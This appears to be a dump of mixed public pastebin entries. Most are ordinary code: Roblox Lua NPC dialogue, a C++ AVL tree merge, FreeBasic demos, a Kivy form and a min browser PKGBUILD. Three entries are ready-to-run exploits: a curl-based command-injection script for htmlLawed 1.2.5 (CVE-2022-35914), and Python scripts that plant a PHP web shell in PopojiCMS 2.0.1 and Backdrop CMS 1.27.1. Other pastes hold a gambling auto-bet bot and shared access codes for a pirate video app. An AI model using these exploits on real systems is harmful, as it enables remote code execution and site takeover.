    for i = 1, #Message do
		Text.Value = string.sub(Message, 1, i)
		NPCImage:FireAllClients(NPCImage)
		PlayerName.Value = ""Jeff"" -- Put whatever you like here
        TypeSound()
        wait(0.05) -- Time between each letter, 0.05 seconds is recommended. The smaller the faster.
    end
end

function SetRandomPlayerText(word)
    Message = word
    RandomPlayer = nil
    wait()
    RandomPlayer = Players:GetChildren()[math.random(1, #Players:GetChildren())]
    PlayerName.Value = RandomPlayer.Name -- Sets the PlayerName to a random player's name
    PlayerImage:FireAllClients(RandomPlayer) -- Sets the image to a random player's head
    for i = 1, #Message do
        Text.Value = string.sub(Message, 1, i)
        TypeSound() -- Plays the typing sound
        wait(0.05)
    end
end

wait(10)
FrameVisible.Value = true
SetNPCText(""Hello and welcome to the Camping Site!"")
wait(5)
SetText(""You will be staying here for a few nights!"")
wait(5)
SetRandomPlayerText(""Yay!"")
wait(5)
SetNPCText(""Go take a look inside that house over there."")
wait(2)
NPC.Humanoid:moveTo(Checkpoints.Checkpoint1.Position)
NPC.Humanoid.MoveToFinished:Wait()
for i, v in pairs(Players:GetChildren()) do
	v.Character.Torso.CFrame = Teleports.HouseTeleport.CFrame
end
wait(3)
SetRandomPlayerText(""Looks cozy!"")
wait(5)
SetNPCText(""Ok everyone, time to go outside."")
wait(5)
NPC.Humanoid:moveTo(Checkpoints.Checkpoint2.Position)
NPC.Humanoid.MoveToFinished:Wait()
wait(0.2)
NPC.Humanoid:moveTo(Checkpoints.Checkpoint3.Position)
NPC.Humanoid.MoveToFinished:Wait()
for i, v in pairs(Players:GetChildren()) do
	v.Character.Torso.CFrame = Teleports.PathTeleport.CFrame
end"
3h1x9FVb,Images,Sungmingamerpro13,CSS,Monday 20th of May 2024 12:09:20 AM CDT,"local PlayerImage = game.ReplicatedStorage:FindFirstChild(""PlayerImage"")
local NPCImage = game.ReplicatedStorage:FindFirstChild(""NPCImage"") -- the RemoteEvent in ReplicatedStorage called ""NPCImage""
local Players = game:GetService(""Players"")
local ThumbnailType = Enum.ThumbnailType.HeadShot
local ThumbnailSize = Enum.ThumbnailSize.Size150x150

PlayerImage.OnClientEvent:Connect(function(RandomPlayer)
    script.Parent.Image = Players:GetUserThumbnailAsync(RandomPlayer.userId, ThumbnailType, ThumbnailSize)
end)

NPCImage.OnClientEvent:Connect(function(NPCImage)
    script.Parent.Image = ""http://www.roblox.com/asset/?id=0"" -- Replace ""0"" with your Decal ID
end)"
jvds51uC,htmlLawed 1.2.5 - Remote Code Execution (RCE) - CVE-2022-35914,FlyFar,Bash,Sunday 19th of May 2024 11:34:27 PM CDT,"# Exploit Title: htmlLawed 1.2.5 - Remote Code Execution (RCE)
# Date: 2024-04-24
# Exploit Author: Miguel Redondo (aka d4t4s3c)
# Vendor Homepage: https://www.bioinformatics.org/phplabware/internal_utilities/htmLawed
# Software Link: https://github.com/kesar/HTMLawed
# Version: <= 1.2.5
# Tested on: Linux
# CVE: CVE-2022-35914

banner(){
  echo ""  ______     _______     ____   ___ ____  ____      _________  ___  _ _  _""
  echo "" / ___\ \   / / ____|   |___ \ / _ \___ \|___ \    |___ / ___|/ _ \/ | || |""
  echo ""| |    \ \ / /|  _| _____ __) | | | |__) | __) |____ |_ \___ \ (_) | | || |_""
  echo ""| |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____|__) |__) \__, | |__   _|""
  echo "" \____|  \_/  |_____|   |_____|\___/_____|_____|   |____/____/  /_/|_|  |_|""
}

while getopts "":u:c:"" arg; do
  case $arg in
    u) URL=$OPTARG; let parameter_counter+=1 ;;
    c) CMD=$OPTARG; let parameter_counter+=1 ;;
  esac
done


if [ -z ""$URL"" ] || [ -z ""$CMD"" ]; then
  banner
  echo -e ""\n[i] Usage: ${0} -u <URL> -c <CMD>\n""
  exit
else
  banner
  echo -e ""\n[+] Command output:""
fi

curl -s -d ""sid=foo&hhook=exec&text=${CMD}"" -b ""sid=foo"" ${URL} | egrep '\&nbsp; \[[0-9]+\] =\>'| sed -E 's/\&nbsp; \[[0-9]+\] =\> (.*)<br \/>/\1/'
            "
BcnA4YPN,PopojiCMS 2.0.1 - Remote Command Execution (RCE),FlyFar,Python,Sunday 19th of May 2024 11:33:20 PM CDT,"# Exploit Title: PopojiCMS 2.0.1 - Remote Command Execution
# Date: 14/04/2024
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://www.popojicms.org/
# Software Link:
https://github.com/PopojiCMS/PopojiCMS/archive/refs/tags/v2.0.1.zip
# Version: Version : 2.0.1
# Tested on: https://www.softaculous.com/apps/cms/PopojiCMS

import requests
import time
import sys

def exploit(url, username, password):

login_url = f""{url}/po-admin/route.php?mod=login&act=proclogin""
login_data = {""username"": username, ""password"": password}
headers = {""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": f
""{url}/po-admin/index.php""}
session = requests.Session()
login_response = session.post(login_url, data=login_data, headers=headers)
if ""Administrator PopojiCMS"" in login_response.text:
print(""Login Successful!"")
time.sleep(1) # 1 saniye bekle
else:
print(""Login Failed!"")
return

edit_url = f""{url}/po-admin/route.php?mod=setting&act=metasocial""
edit_data = {""meta_content"": """"""<html>
<body>
<form method=""GET"" name=""<?php echo basename($_SERVER['PHP_SELF']); ?>"">
<input type=""TEXT"" name=""cmd"" autofocus id=""cmd"" size=""80"">
<input type=""SUBMIT"" value=""Execute"">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
system($_GET['cmd']);
}
?>
</pre>
</body>
</html>""""""}
edit_response = session.post(edit_url, data=edit_data, headers=headers)
if ""cmd"" in edit_response.text:
print(""Your shell is ready:"", url)
time.sleep(1)
else:
print(""Exploit Failed!"")
return

if __name__ == ""__main__"":
if len(sys.argv) != 4:
print(""Kullanım: python exploit.py sitename username password"")
sys.exit(1)

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
print(""Exploiting..."")
time.sleep(1)
print(""Logging in..."")
time.sleep(1)
exploit(url, username, password)
            "
4rDYiVxi,Backdrop CMS 1.27.1 - Remote Command Execution (RCE),FlyFar,Python,Sunday 19th of May 2024 11:32:24 PM CDT,"# Exploit Title: Backdrop CMS 1.27.1 - Remote Command Execution (RCE)
# Date: 04/27/2024
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://backdropcms.org/
# Software Link: https://github.com/backdrop/backdrop/releases/download/1.27.1/backdrop.zip
# Version: latest
# Tested on: MacOS

import os
import time
import zipfile



def create_files():
info_content = """"""
type = module
name = Block
description = Controls the visual building blocks a page is constructed
with. Blocks are boxes of content rendered into an area, or region, of a
web page.
package = Layouts
tags[] = Blocks
tags[] = Site Architecture
version = BACKDROP_VERSION
backdrop = 1.x

configure = admin/structure/block

; Added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1709862662
""""""
shell_info_path = ""shell/shell.info""
os.makedirs(os.path.dirname(shell_info_path), exist_ok=True) # Klasörü
oluşturur
with open(shell_info_path, ""w"") as file:
file.write(info_content)

shell_content = """"""
<html>
<body>
<form method=""GET"" name=""<?php echo basename($_SERVER['PHP_SELF']); ?>"">
<input type=""TEXT"" name=""cmd"" autofocus id=""cmd"" size=""80"">
<input type=""SUBMIT"" value=""Execute"">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
system($_GET['cmd']);
}
?>
</pre>
</body>
</html>
""""""
shell_php_path = ""shell/shell.php""
with open(shell_php_path, ""w"") as file:
file.write(shell_content)

return shell_info_path, shell_php_path

def create_zip(info_path, php_path):
zip_filename = ""shell.zip""
with zipfile.ZipFile(zip_filename, 'w') as zipf:
# Dosyaları shell klasörü altında sakla
zipf.write(info_path, arcname='shell/shell.info')
zipf.write(php_path, arcname='shell/shell.php')
return zip_filename

def main(url):
print(""Backdrop CMS 1.27.1 - Remote Command Execution Exploit"")
time.sleep(3)

print(""Evil module generating..."")
time.sleep(2)

info_path, php_path = create_files()
zip_filename = create_zip(info_path, php_path)

print(""Evil module generated!"", zip_filename)
time.sleep(2)

print(""Go to "" + url + ""/admin/modules/install and upload the "" +
zip_filename + "" for Manual Installation."")
time.sleep(2)

print(""Your shell address:"", url + ""/modules/shell/shell.php"")

if __name__ == ""__main__"":
import sys
if len(sys.argv) < 2:
print(""Usage: python script.py [url]"")
else:
main(sys.argv[1])
            "
MU6A7NRD,AVL merge,hpnq,C++,Sunday 19th of May 2024 10:28:26 PM CDT,"#include ""bits/stdc++.h""
//speed coding handle

#define mp make_pair
#define cve(tpy) for (auto i : tpy) {for(auto j : i){cout << j << "" "";  }cout << ""\n"";} ;
#define f first
#define s second
#define loop(i, x, n) for (int i = x; i < n; i++)
#define joop(x, n) for (ll j = x; j < n; j++)
#define lp(n) for (ll i = 0; i < n; i++)
#define err cout << ""ERROR"" << endl;
#define all(x) x.begin(), x.end()
#define pb push_back
#define sz(x) x.size()
#define rndm rng()

// types
#define pii pair<int, int>
#define pll pair<ll, ll>
#define vvi vector<vector<int>>
#define vvll vector<vector<ll>>
typedef long long ll;
typedef long double ld;

// types of data
#define inf 1000000000
#define infll 1000000000000000000
#define INF ll(1e18)

#define md 998244353
#define mod 1000000009
//#define K 239017

#define DEBUG 1
using namespace std;
mt19937_64 rng(113113);
uniform_int_distribution<ll> drist;

struct node // структура для представления узлов дерева
{
    int info;//значение
    node *left;//ссылка на левое поддерево
    node *right;//ссылка на правое поддерево
    int balance; // поле баланса= высота правого поддерева - высота левого поддерева
};


int Height(node *root)// вычисляет высоту дерева
{
    if (root == nullptr) return 0;//если дерево пусто возвращаем 0
    //иначе
    int hLeft = Height(root->left),//считаем высоту левого поддерева
    hRight = Height(root->right); //считаем высоту правого поддерева
    return max(hLeft, hRight) + 1;

}

void SetBalance(node *(&root))//нахождение значение баланса для текущего узла
{
    if (root != nullptr)
        root->balance = Height(root->right) - Height(root->left);
}

void TurnLeft(node *(&root))//левый поворот АВЛ-дерева
{
    node *rightSubtree, *rightSubtreeLeftSubtree;
    rightSubtree = root->right;
    rightSubtreeLeftSubtree = rightSubtree->left;

    rightSubtree->left = root;
    root->right = rightSubtreeLeftSubtree;
    root = rightSubtree;
    SetBalance(root->left);
    SetBalance(root);
}

void TurnRight(node *(&root))//правый поворот
{
    node *leftSubtree, *leftSubtreeRightSubtree;
    leftSubtree = root->left;
    leftSubtreeRightSubtree = leftSubtree->right;

    leftSubtree->right = root;
    root->left = leftSubtreeRightSubtree;
    root = leftSubtree;
    SetBalance(root->right);
    SetBalance(root);
}


void insert(node *(&root), int d) // добавление узла в дерево поиска
{
    if (root == nullptr)//нашли пустой указатель – пустое место
    { //создаём новый узел дерева на найденном месте
        root = new node;
        root->info = d;
        root->balance = 0;
        root->left = nullptr;
        root->right = nullptr;
    }
    else//текущий узел не пуст
    {
        if (d > root->info)//идём в правое поддерево

        {
            insert(root->right, d);//добавляем узел в правое поддерево
            if (Height(root->right) - Height(root->left) > 1)//если баланс АВЛ-дерева нарушен
            {//выполняем вращения
                if (Height(root->right->right) < Height(root->right->left))//а если были еще проблемы в поддеревьях у правого поддерева
                    TurnRight(root->right);//то предварительно поворачиваем правое поддерево
                TurnLeft(root);//поворот дерева влево
            }
        }
        else if (d < root->info)//идём в левое поддерево

        {

            insert(root->left, d);//добавляем узел в левое поддерево
            if (Height(root->left) - Height(root->right) > 1)//если баланс АВЛ-дерева нарушен
            {
                if (Height(root->left->left) < Height(root->left->right))//а если были еще проблемы в поддеревьях у левого поддерева
                    TurnLeft(root->left);//то предварительно поворачиваем левое поддерево
                TurnRight(root);//поворот дерева вправо
            }
        }

        SetBalance(root);//пересчитываем значение баланса
    }
}

void copytree(node *(&T1), node * (&root)){
//    node *root = new node;


}
void print(node *p);
void balance(node *(&root)) // балансировка
{
    if (root != nullptr)//нашли пустой указатель – пустое место//текущий узел не пуст
    {
        // сортим правое
        balance(root->right);//добавляем узел в правое поддерево
        if (Height(root->right) - Height(root->left) > 1)//если баланс АВЛ-дерева нарушен
        {//выполняем вращения
            if (Height(root->right->right) < Height(root->right->left))//а если были еще проблемы в поддеревьях у правого поддерева
                TurnRight(root->right);//то предварительно поворачиваем правое поддерево
            TurnLeft(root);//поворот дерева влево
        }

        //идём в левое поддерево


        balance(root->left);//идём
        if (Height(root->left) - Height(root->right) > 1)//если баланс АВЛ-дерева нарушен
        {
            if (Height(root->left->left) < Height(root->left->right))//а если были еще проблемы в поддеревьях у левого поддерева
                TurnLeft(root->left);//то предварительно поворачиваем левое поддерево
            TurnRight(root);//поворот дерева вправо
            cout << ""PPPPP"" << endl;

        }


        SetBalance(root);//пересчитываем значение баланса
    }
}
node* merge(node *(&T1), node *(T2)){
    // выбрать левый в T2, удалить, добавить root(t1), добавить удалённое

    // удалить самую правую,
    // идем по 2му, когда высота
    node *v1 = T1, *pv1 = new node;
    while(v1->right){
        pv1 = v1;
        v1 = v1->right;

//        v->left = nullptr;
    }
    pv1->right = nullptr;
    // нашёл отчистил
    node *v2 = T2, *pv2 = new node;
    while(v2 != nullptr and Height(v2) != Height(T1)){
        cout << ""ERR "" << v2->info << endl;
        pv2 = v2;
        v2 = v2->left;
    }
    node *S = new node;
    S->info = v1->info;
    S->left = T1;
    S->right = v2;

    cout << ""\n S: \n"";
    print(S);
    cout << ""\nv2\n"" << v2->info;
    pv2->left = S;
//    balance(T2);
    cout << ""Start:\n"";
    print(T2);
    balance(T2);
    print(T2);
    cout << ""End\n"";
//    cout << ""LEFT:"" << v->info << "" "" << pv->info << ""\n"";
//    pv->left = T1;
    return T2;

//    insert(T2, v->info);




}

void output(node *p)// распечатка дерева в симметричном порядке
{
    if (p != nullptr)
    {
        output(p->left);
        cout << p->info << "" "";
        output(p->right);
    }
}

void print_n(const node *p, int n, int level, int prob)//печать n-ого уровня дерева, level - это номер уровня
{
    if (p)
    {
        if (level == n)
        {
            for (int i = 1; i <= prob; i++) cout << "" "";
            cout << p->info;
        }
        else
        {
            print_n(p->left, n, level + 1, prob);
            print_n(p->right, n, level + 1, prob);
        }
    }
}

void print(node *p) //распечатка дерева по уровням
{
    int h = Height(p);
    int prob = 3;
    if (p)
    {
        for (int i = 0; i <= h; i++)//вот здесь задаются номера уровней
        {
            print_n(p, i, 0, prob*(h - i));//вызывается функция печати n-ого уровня дерева
            cout << endl;
        }
    }
    cout << ""H "" << h << endl;
}


void clear(node **p) // очистка
{
    if ((*p) != nullptr) {
        cout << ""ERRr "" << (*p)->info << endl;

        clear(&(*p)->left);
        clear(&(*p)->right);

        delete *p;
        *p = nullptr;
    }
}

void solve()
{
    int  d;
    char ch;
    node *root;
    root = nullptr;
    do {
        cout << ""enter num"" << endl;
        cin >> d;
        insert(root, d);
        cout << ""eshe? (y/n)"" << endl;
        cin >> ch;

    } while (ch != 'n');

    node *root2;
    root2 = nullptr;
    do {
        cout << ""enter num"" << endl;
        cin >> d;
        insert(root2, d);
        cout << ""eshe? (y/n)"" << endl;
        cin >> ch;

    } while (ch != 'n');

    cout << endl;
    cout << ""print1"" << endl;
    print(root);

    cout << ""print2"" << endl;
    print(root2);
    node *t = merge(root, root2);
    cout << ""print:\n"";

    print(t);

    cout << ""simm:\n"";
    output(t);
//    cout << ""\n EDGE: "" << t->info << endl;
//    clear(&root);
//    clear(&root2);
    clear(&t);
    if (!root and !root2 and !t) { cout << ""cleared!"" << endl; }
    else { cout << ""err!"" << endl; }
    system(""pause"");
}

int main() {
    ios::sync_with_stdio(0);
    cin.tie(0);
#ifdef DEBUG
    freopen(""text.txt"", ""r"", stdin);
//    freopen(""output.txt"", ""w"", stdout);
#endif
    solve();
    return 1;
}

"
TeqE7wbW,Untitled,Mysoft,FreeBasic,Sunday 19th of May 2024 09:52:36 PM CDT,"#include ""fbgfx.bi""

'for N as long = 128 to 255
'  print chr$(N);"" "";
'  if (N and 15)=15 then print
'next N

'print ""/¨\__:__/¨\""
'print ""\_/  ^  \_/""

width 80,25
locate ,,0

dim as long BikeOldCol,BikeOldLin,BikeSpeed=1
dim as long iN

dim as string sRoad(5)
for N as long = 0 to 39
  sRoad(0) += ""##""
next N
for N as long = 1 to 5
  sRoad(N) = space(80)
next N

dim as integer iGap,iJump=40,iBikeJump=0
do
  dim as long BikeLin=15+iBikeJump\50,BikeCol=20+(cos(BikeSpeed/25)*25)
  if BikeOldLin <> BikeLin or BikeOldCol <> BikeCol then
    color 3 : BikeOldCol = BikeCol : BikeOldLin = BikeLin
    locate BikeLin-1,BikeCol : print ""             "";
    locate BikeLin+0,BikeCol : print ""          _  "";
    locate BikeLin+1,BikeCol : print ""      _   |  "";
    locate BikeLin+2,BikeCol : print ""    __:__    "";
    locate BikeLin+3,BikeCol : print ""      ^      "";
    locate BikeLin+4,BikeCol : print ""             "";
  end if
  if iN then color 7 else color 9
  locate BikeLin+2,BikeCol+11 : print !""\\\8\8\8/\8\8\8\8\8\8\8\8\238"";
  locate BikeLin+3,BikeCOl+10 : print !""_\8\8\8\8\8\8\8\8/\8\8\8\\"";
  if iN then color 9 else color 7
  locate BikeLin+2,BikeCOl+10 : print !""\238\8\8\8\8\8\8\8\8\\\8\8\8/"";
  locate BikeLin+3,BikeCOl+11 : print !""/\8\8\8\\\8\8\8\8\8\8\8\8_"";
  
  if iGap then 
    iGap = iGap-1
  else    
    if rnd<.01 then iGap = 21
  end if
  
  if iBikeJump=0 then
    if multikey(fb.SC_SPACE) then iJump = -BikeSpeed : iBikeJump = -1
  else
    iBikeJump += iJump
    if iBikeJump > 0 then iBikeJump=0
    if iJump < 50 then iJump += 4
    
  end if
  
  color 6
  for N as long = 0 to 5
    if N=1 then color 5
    locate 19+N,1 : print sRoad(N);
  next N
  
  for N as long = 0 to 5
    sRoad(N) = mid(sRoad(N),2)
    if N=0 then
      if iGap>10 then 
        if iGap=21 then sRoad(N) += ""\"" else sRoad(N) += "" ""
      elseif iGap then
        sRoad(N) += ""-""
      else
        if iN then sRoad(N) += ""="" else sRoad(N) += ""-""
      end if
    else
      if iGap=1 orelse iGap=21 then
        sRoad(N) += ""|""
      elseif iGap=0 andalso rnd < .05 then 
        sRoad(N) += chr(32+rnd*15) 
      else 
        sRoad(N) += "" ""
      end if
    end if
  next N   
  
  iN xor= 1
  sleep 200-BikeSpeed*4  
  if BikeSpeed < 40 andalso iN then BikeSpeed += 1
  
loop"
9DR3qQJ6,Untitled,ElliotDG,Python,Sunday 19th of May 2024 09:46:19 PM CDT,"from kivy.app import App
from kivy.lang import Builder
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.properties import StringProperty

kv = """"""
#: import NoTransition kivy.uix.screenmanager.NoTransition

<Label>
    size_hint: (None, None)
    width: 200
    height: 50
    
<TextInput>
    size_hint: (None, None)
    width: 200
    height: 50
    multiline: False
    write_tab: False

<MainMenu>
    GridLayout:
        Button:
            text: ""Add to Database""
            size: root.width * .2, root.height * .05
            pos: root.width * .05, root.height * .8
            font_size: root.height * .035
            on_release:
                root.manager.transition = NoTransition()
                root.manager.current = ""DatabaseAdd""
        Button:
            text: ""Search Database""
            size: root.width * .2, root.height * .05
            pos: root.width * .05, root.height * .7
            font_size: root.height * .035
            on_release:
                root.manager.transition = NoTransition()
                root.manager.current = ""SearchDatabase""  # change to root.manager.current

<DatabaseAdd>
    name: ""DatabaseAdd""
    name_first: id1
    name_last: id2
    #id3: id3
    #id4: id4
    #id5: id5
    #id6: id6
    #id7: id7
    #id8: id8
    AnchorLayout:
        width: root.width
        height: root.height
        ScrollView:
            do_scroll_y: True
            do_scroll_x: False
            size_hint: (None, None)
            size: (root.width * .8, root.height * .8)
            #width: root.width * .80
            #height: root.height * .8
            anchor_x: ""center""
            anchor_y: ""center""
            GridLayout:
                cols: 1
                GridLayout:
                    cols: 4
                    size_hint_y: None
                    height: self.minimum_height
                    Label:
                        #text: ""First Name""
                        text: root.id1Label  # changed to root, and moved property
                    TextInput:
                        id: id1
                    Label:
                        text: ""Last Name""
                    TextInput:
                        id: id2
                    #Label:
                        #text: ""Value 3""
                    #TextInput:
                        #id: id3
                    #Label:
                        #text: ""Value 4""
                    #TextInput:
                        #id: id4
                    #Label:
                        #text: ""Value 5""
                    #TextInput:
                        #id: id5
                    #Label:
                        #text: ""Value 6""
                    #TextInput:
                        #id: id6
                    #Label:
                        #text: ""Value 7""
                    #TextInput:
                        #id: id7
                    #Label:
                        #text: ""Value 8""
                    #TextInput:
                        #id: id8
                BoxLayout:
                    size_hint: None, None
                    size: self.minimum_size
                    Label:
                        width: (root.width * .8)/5
                    Button:
                        text: ""Submit""
                        width: (root.width * .8)/5
                        on_press: root.press()
                    Label:
                        width: (root.width * .8)/5
                    Button:
                        text: ""Clear""
                        width: (root.width * .8)/5
                        on_press: root.clear()
                    Label:
                        width: (root.width * .8)/5

<SearchDatabase>:
    Label:
        size_hint: 1, 1
        text: 'Placeholder for search database'

WindowManager:
    MainMenu:
    DatabaseAdd:
    SearchDatabase:
        name: ""SearchDatabase""

""""""


class WindowManager(ScreenManager):
    pass

class MainMenu(Screen):
    pass

class DatabaseAdd(Screen):
    id1Label = StringProperty('First Name')

    # def __init__(self, **kwargs):  # __init__ ? Not sure what you want to do here
    #     super().__init__(**kwargs)
    #     self.id1Label = StringProperty(""First Name"")  Property must be at class level
    #
    def press(self):
        name_first = self.name_first.text
        name_last = self.name_last.text
        print(name_first, name_last)
        self.clear()

    def clear(self):
        self.name_first.text = """"
        self.name_last.text = """"

class SearchDatabase(Screen):
    pass

class MainApp(App):
    def build(self):
        return Builder.load_string(kv)

if __name__ == ""__main__"":
    MainApp().run()
"
mGzQSDFH,Pastebin.ai - #1 Pastebin Alternative,xxsa,PHP,Sunday 19th of May 2024 09:26:08 PM CDT,"https://pastebin.ai - #1 Pastebin Alternative - its free and always will be.

pastebin.ai  is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Simple Ads by Google Adsense Few rather than Pastebin
150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes.
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
.
..................................
"
68GMtivb,Untitled,Mysoft,FreeBasic,Sunday 19th of May 2024 09:17:42 PM CDT,"#include ""vbcompat.bi""
#include ""crt.bi""

function UtcOffset() as double
  dim as time_t t0,t1  
  t0 = mktime(gmtime(@t0))  
  t1 = mktime(localtime(@t1))    
  return difftime(t0,t1)/(3600*24)
end function

'required once
var dUTCOffset =  UtcOffset() 

'so to conver then it's juts
var dNowUTC = now()+dUTCOffset
print hour(dNowUTC)
print minute(dNowUTC)

sleep"
yuwkz9m0,fuuck off hacker,coinwalk,JavaScript,Sunday 19th of May 2024 08:43:51 PM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var prefit = Number((elderly/1000).toFixed(8));
var beast = prefit;
var tens = (prefit*10);
var hunt = (prefit*100);
var tentyfour = (prefit*64)
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var winnerdinner = (elderly*24);
var snowie = ((Math.floor(elderly/tens))*tens);
var great = elderly;
var bolux = false;
var upped = 6.9;
var downed = 2.9;
var mighty = elderly;
var baboon = ((Math.floor(elderly/tens))*tens);
var joe = ((Math.floor(elderly/tens))*tens);

function go(){
great = Number(document.getElementById('pct_balance').value);
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if (great>(snowie+(beast*upped))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if (great<(snowie-(beast*downed))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if ((great<=(baboon-tentyfour))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    baboon = ((Math.floor(great/tens))*tens);
    joe = ((Math.floor(great/tens))*tens);
    snowie = ((Math.floor(great/tens))*tens);
}
if ((great>=(joe+tentyfour))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    baboon = ((Math.floor(great/tens))*tens);
    joe = ((Math.floor(great/tens))*tens);
    snowie = ((Math.floor(great/tens))*tens);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1200);
}
go();"
8zHzJ4pH,xXx 20240516,RizkiKhaizir,CSS,Sunday 19th of May 2024 08:38:49 PM CDT,"<== NgenTAM.my.iD ==>
Kode Aktif Per 16 Mei 2024

✨ Selalu lakukan Clear Disk Cache aplikasinya sebelum menonton
✨ APK NgenTAM v23.08.01 http://slpre.com/APKxXx - KFiles
✨ APK NgenTAM v23.08.01 http://slpre.com/cHWa1 - Send.cm
✨ APK NgenTAM v23.08.01 http://slpre.com/KZrud - sFile
✨ APK NgenTAM v23.08.01 http://slpre.com/VqdAP - Telegram

🔈 Dilarang untuk Membongkar kode, nikmati saja apa adanya channel yang ada.
🔈 Kode Ini GRATIS !!! Dilarang memperjual-belikan Kode dan Aplikasi.
🔈 Gunakan dengan bijak aplikasi dan kode ini

KODE VOD xXx : 65591395
WAJIB menggunakan aplikasi NgenTAM v23.08.01 yang bisa didownload pada link di atas. Kode tidak bisa digunakan di aplikasi ZalTV.

⚠️ Kode jangan disebarkan keluar grup, ke facebook atau konten youtube, hargai pembuat kode dan channel.
⚠️ Jika kode kedapatan dishare keluar grup, dijual atau di jadikan konten youtube, maka akan di RESET.

- Terimakasih -"
H3c3yU95,min.js,reebypastalina,JavaScript,Sunday 19th of May 2024 08:25:48 PM CDT,"#!/usr/bin/@ELECTRON@

const name = 'min';

const {app} = require('electron');
const fs = require('fs');
const path = require('path');

// Change command name.
const fd = fs.openSync('/proc/self/comm', fs.constants.O_WRONLY);
fs.writeSync(fd, name);
fs.closeSync(fd);

// Remove first command line argument (/usr/bin/electron).
process.argv.splice(0, 1);

// Set application paths.
const appPath = path.join(path.dirname(__dirname), name);
const packageJson = require(path.join(appPath, 'package.json'));
const productName = packageJson.productName;
app.setAppPath(appPath);
app.setDesktopName(name + '.desktop');
app.setName(productName);
app.setPath('userCache', path.join(app.getPath('cache'), productName));
app.setPath('userData', path.join(app.getPath('appData'), productName));
app.setVersion(packageJson.version);

// Run the application.
require('module')._load(appPath, module, true);
"
z6TUQCah,min.sh,reebypastalina,Bash,Sunday 19th of May 2024 08:25:23 PM CDT,"#!/usr/bin/sh

/usr/lib/min/min.js
"
ux1vi3vw,min browser PKGBUILD,reebypastalina,Bash,Sunday 19th of May 2024 08:24:51 PM CDT,"pkgname=min
pkgver=1.32.1
_electronver=29
pkgrel=1
pkgdesc='A fast, minimal browser that protects your privacy'
arch=('x86_64')
url='https://minbrowser.org/'
license=('Apache')
depends=(""electron${_electronver}"" 'libsecret')
makedepends=('git' 'npm')
options=(!emptydirs)
source=(https://github.com/minbrowser/min/archive/v$pkgver/$pkgname-$pkgver.tar.gz
        'min.desktop'
        'min.js'
        'min.sh'
        'icon.patch')
sha256sums=('760fb5d4d10a8d5a44dad6f0e7b3ee58576f46fba5098df39a3fff8576c0086f'
            'a069caac07638ca2bafde5f96a4db646ec7484741ff9b44788c2e159b5142650'
            'de76a609bdbedba2d3c59f4ff2ff05c74211876fa7c52db461f9475b63a682a1'
            'b6909f49c61dfe3ef2610ef966e43ab3b0b423422d17e753706b8e92e0da2b2b'
            '3cff8e5613907c3776115ccdb14f37a4899c96874f662281a630912d893c1d87')

prepare() {
    cd $pkgname-$pkgver

    patch -Np1 -i ""${srcdir}""/icon.patch
}

build() {
    cd $pkgname-$pkgver

    npm install
    npm run build
    rm -r node_modules
    cat /dev/null > scripts/setupDevEnv.js
    npm install --omit=dev --omit=optional
}

package() {
    cd $pkgname-$pkgver

    appdir=/usr/lib/${pkgname}

    install -dm755 ""${pkgdir}""${appdir}
    cp -r * ""${pkgdir}""${appdir}

    install -dm755 ""${pkgdir}""/usr/share/icons/hicolor/256x256/apps
    mv icons/icon256.png \
        ""${pkgdir}""/usr/share/icons/hicolor/256x256/apps/${pkgname}.png

    install -d ""${pkgdir}/usr/bin""
    sed -i -e ""s|@ELECTRON@|electron${_electronver=19}|"" ""${srcdir}/${pkgname}.js""
    install -m755 ""${srcdir}/${pkgname}.js"" ""${pkgdir}/${appdir}/${pkgname}.js""
    install -m755 ""${srcdir}/${pkgname}.sh"" ""${pkgdir}/usr/bin/${pkgname}""

    install -Dm644 ""${srcdir}""/${pkgname}.desktop \
            ""${pkgdir}""/usr/share/applications/${pkgname}.desktop

    # Clean up
    rm ""${pkgdir}""${appdir}/dist/build.js
    rm -r ""${pkgdir}""${appdir}/icons
    rm -r ""${pkgdir}""${appdir}/localization
    rm -r ""${pkgdir}""${appdir}/main
    rm -r ""${pkgdir}""${appdir}/scripts
    find ""${pkgdir}""${appdir} \
        -name ""package.json"" \
            -exec sed -e ""s|${srcdir}/${pkgname}|${appdir}|"" \
                -i {} \; \
        -or -name "".*"" -prune -exec rm -r '{}' \; \
        -or -name ""*.Makefile"" -exec rm '{}' \; \
        -or -name ""*.h"" -exec rm '{}' \; \
        -or -name ""*.c"" -exec rm '{}' \; \
        -or -name ""*.cc"" -exec rm '{}' \; \
        -or -name ""*.gypi"" -exec rm '{}' \; \
        -or -name ""*.mk"" -exec rm '{}' \; \
        -or -name ""Gruntfile.js"" -exec rm '{}' \; \
        -or -name ""Makefile"" -exec rm '{}' \; \
        -or -name ""bin"" -prune -exec rm -r '{}' \; \
        -or -name ""bin.js"" -exec rm '{}' \; \
        -or -name ""bower.json"" -exec rm '{}' \; \
